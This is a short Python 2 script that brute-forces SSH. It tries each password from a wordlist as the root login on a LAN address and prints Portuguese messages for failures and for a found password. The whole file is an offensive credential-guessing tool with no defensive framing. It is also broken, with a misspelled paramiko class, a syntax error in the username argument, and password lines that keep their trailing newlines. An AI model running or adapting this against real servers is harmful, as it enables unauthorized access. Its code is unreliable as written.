#!/usr/bin/python
import paramiko

ssh = paramiko.SSHCliente()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open("lista.text")
for line in f.readlines():

	try:

		ssh.connect("192.168.0.17", username"root", password=line)

	except paramiko.AuthenticationException:
		print "Acesso Negado",line
	else:
		print "[+] - Senha encontrada [+]",line
		break
ssh.close()
